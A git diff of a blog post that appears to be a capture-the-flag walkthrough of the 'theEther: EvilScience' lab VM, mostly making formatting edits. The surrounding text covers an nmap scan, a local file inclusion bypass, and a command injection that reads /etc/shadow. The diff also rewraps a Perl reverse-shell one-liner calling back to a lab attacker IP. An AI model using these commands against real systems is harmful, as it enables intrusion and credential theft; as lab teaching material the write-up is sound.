@@ -17,7 +17,7 @@ A mysterious company, _The Ether_ has proclaimed an elixir that considerably alt
 
 ### Information Gathering
 
-Let's kick this off with a nmap scan to establish the services available in **theEther**:  
+Let's kick this off with a `nmap` scan to establish the services available in **theEther**:  
 `# map -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130`
 
 ```
@@ -104,7 +104,7 @@ However, I had success displaying the content of `/usr/share/apache2/icons/READM
 
 This would means that absolute path is allowed but some kind of filtering for common LFI attacks is in place. It also means that the [**DocumentRoot**][3]{:target='_blank'} is not your usual `/var/www/html`. :sweat:
 
-Here's what I imagined the PHP code in `/index.php` looked like:
+Here's what I imagined the PHP code in `/index.php` looked like.
 
 ```php
 <?php
@@ -160,7 +160,7 @@ Moving up the next level got me stuck for hours. Not knowing how to move forward
 
 ![theether.com](/assets/images/posts/evilscience-walkthrough/evilscience-7.png)
 
-Using that as base, I created a custom wordlist with `python`:
+Using that as base, I created a custom wordlist with `python`.
 
 ```python
 # cat crunch.py
@@ -322,7 +322,7 @@ sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
 
 Also, not quite the PHP code I imagined but close.
 
-```
+```php
 # ./cmd.sh -e "cat index.php"
 <?php
     $file = $_GET["file"];
@@ -337,7 +337,7 @@ Also, not quite the PHP code I imagined but close.
 
 if ($file == "/var/log/auth.log") {
     header("location: index.php");
-} else{
+} else {
     include($file);
 }
     include($file);
@@ -346,7 +346,9 @@ if ($file == "/var/log/auth.log") {
 
 Awesome. Now that I can execute remote commands, it's reverse shell time. I always liked my reverse shell in Perl whenever it's available on the target system:
 
-`perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+```perl
+perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+```
 
 To avoid complications it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.
 
@@ -390,7 +392,7 @@ Armed with this new knowledge that `cat` was used, let's see if we can display `
 
 Holy smoke! It worked.
 
-My guess is that the command that ran was like so:
+My guess is that the command that ran was like so.
 
 `cat /var/log/auth.log /etc/shadow`
 
